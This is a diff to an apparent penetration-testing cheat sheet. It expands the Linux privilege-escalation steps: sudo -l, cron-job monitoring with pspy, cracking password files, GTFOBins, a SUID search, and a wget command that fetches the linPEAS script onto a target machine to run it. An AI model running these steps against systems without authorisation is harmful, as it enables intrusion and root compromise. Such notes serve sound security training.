@@ -3136,13 +3136,17 @@ For PHP, you can take a look at this RS from PentestMonkey: [PHP Reverse Shell](
 
 ## Privilege Escalation 
 Check for root password
-Run: `id`  
-Run: `sudo -l`  
-Locate password folder and crack it using johntheripper  
-Or use [GTFOBins](https://gtfobins.github.io)
+* Run: `id`  
+* Run: `sudo -l` to list commands that can be run as root  
+* Locate password folder and crack it using johntheripper
+* Remember to look for cron jobs or other running tasks. If they require root, use [pspy](https://github.com/DominicBreuker/pspy).
+* Or use [GTFOBins](https://gtfobins.github.io) 
 
 You can also run:  
-`wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh` on a target machine to see the files that stand out.
+```bash
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+```
+To download and then execute the script on a target machine to see the files that stand out.
 
 Another option would be to run the following command to find all files with the SUID bit set:   
 `find / -perm -u=s -type f 2>/dev/null` fine  
